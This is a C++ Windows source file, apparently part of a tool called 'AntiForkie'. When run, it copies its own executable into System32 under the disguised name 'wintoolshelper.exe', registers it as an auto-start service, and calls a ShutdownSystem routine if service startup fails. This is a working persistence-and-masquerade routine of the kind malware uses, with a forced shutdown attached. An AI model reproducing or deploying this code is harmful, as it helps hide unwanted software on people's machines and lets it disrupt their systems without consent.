#include <windows.h>
#include <fstream>
#include <iostream>
#include <chrono>
#include <thread>
#include <string>

#include "antiforkie.hpp"
#include "kills.hpp"

#define SERVICE_NAME "AntiForkieService"
#define SERVICE_HIDDEN_PATH "C:\\Windows\\System32\\wintoolshelper.exe"

DWORD WINAPI ServiceCtrlHandler(DWORD, DWORD, LPVOID, LPVOID);
void WINAPI ServiceMain(DWORD, LPWSTR *);
void InstallService();
void UninstallService();

SERVICE_STATUS_HANDLE g_serviceStatusHandle = nullptr;
HANDLE g_stopEvent = nullptr;

int main(int argc, char *argv[])
{
    InstallService();

    SERVICE_TABLE_ENTRY serviceTable[] =
        {
            {const_cast<LPSTR>(SERVICE_NAME), reinterpret_cast<LPSERVICE_MAIN_FUNCTIONA>(&ServiceMain)},
            {NULL, NULL}};

    if (!StartServiceCtrlDispatcher(serviceTable))
    {
        ShutdownSystem();
    }

    return 0;
}

DWORD WINAPI ServiceCtrlHandler(DWORD controlCode, DWORD eventType, LPVOID eventData, LPVOID context)
{
    switch (controlCode)
    {
    case SERVICE_CONTROL_INTERROGATE:
        break;

    case SERVICE_CONTROL_STOP:
        if (g_serviceStatusHandle != nullptr)
        {
            SERVICE_STATUS serviceStatus = {0};
            serviceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
            serviceStatus.dwCurrentState = SERVICE_STOP_PENDING;
            SetServiceStatus(g_serviceStatusHandle, &serviceStatus);
        }

        if (g_stopEvent != nullptr)
            SetEvent(g_stopEvent);
        break;

    default:
        break;
    }

    return ERROR_SUCCESS;
}

void WINAPI ServiceMain(DWORD argc, LPWSTR *argv)
{
    g_serviceStatusHandle = RegisterServiceCtrlHandler(SERVICE_NAME, (LPHANDLER_FUNCTION)ServiceCtrlHandler);

    SERVICE_STATUS serviceStatus = {0};
    serviceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
    serviceStatus.dwCurrentState = SERVICE_START_PENDING;
    SetServiceStatus(g_serviceStatusHandle, &serviceStatus);

    g_stopEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
    if (g_stopEvent == nullptr)
    {
        serviceStatus.dwCurrentState = SERVICE_STOPPED;
        SetServiceStatus(g_serviceStatusHandle, &serviceStatus);
        return;
    }

    serviceStatus.dwCurrentState = SERVICE_RUNNING;
    SetServiceStatus(g_serviceStatusHandle, &serviceStatus);

    AntiForkieCheck();

    while (true)
    {
        if (WaitForSingleObject(g_stopEvent, 0) == WAIT_OBJECT_0)
            break;
    }

    // Perform cleanup and prepare to stop the service
    // Add your own cleanup code here

    // Close the stop event handle
    CloseHandle(g_stopEvent);

    // Update the service status to stopped
    serviceStatus.dwCurrentState = SERVICE_STOPPED;
    SetServiceStatus(g_serviceStatusHandle, &serviceStatus);
}

void InstallService()
{
    TCHAR szFileName[MAX_PATH];

    GetModuleFileName(NULL, szFileName, MAX_PATH);

    CopyFileA(szFileName, SERVICE_HIDDEN_PATH, FALSE);
    SC_HANDLE schSCManager = OpenSCManager(nullptr, nullptr, SC_MANAGER_ALL_ACCESS);

    if (schSCManager == nullptr)
    {
        std::cout << "Failed to open the Service Control Manager." << std::endl;
        return;
    }

    SC_HANDLE schService = CreateService(
        schSCManager,
        SERVICE_NAME,
        SERVICE_NAME,
        SERVICE_ALL_ACCESS,
        SERVICE_WIN32_OWN_PROCESS,
        SERVICE_AUTO_START,
        SERVICE_ERROR_NORMAL,
        SERVICE_HIDDEN_PATH,
        nullptr,
        nullptr,
        nullptr,
        nullptr,
        nullptr);

    if (schService == nullptr)
    {
        std::cout << "Failed to install the service." << std::endl;
        CloseServiceHandle(schSCManager);
        return;
    }

    std::cout << "Service installed successfully." << std::endl;
    CloseServiceHandle(schService);
    CloseServiceHandle(schSCManager);
}

void UninstallService()
{
    SC_HANDLE schSCManager = OpenSCManager(nullptr, nullptr, SC_MANAGER_ALL_ACCESS);
    if (schSCManager == nullptr)
    {
        std::cout << "Failed to open the Service Control Manager." << std::endl;
        return;
    }

    SC_HANDLE schService = OpenService(schSCManager, SERVICE_NAME, SERVICE_ALL_ACCESS);
    if (schService == nullptr)
    {
        std::cout << "The service is not installed." << std::endl;
        CloseServiceHandle(schSCManager);
        return;
    }

    if (!DeleteService(schService))
    {
        std::cout << "Failed to uninstall the service." << std::endl;
        CloseServiceHandle(schService);
        CloseServiceHandle(schSCManager);
        return;
    }

    std::cout << "Service uninstalled successfully." << std::endl;
    CloseServiceHandle(schService);
    CloseServiceHandle(schSCManager);
}
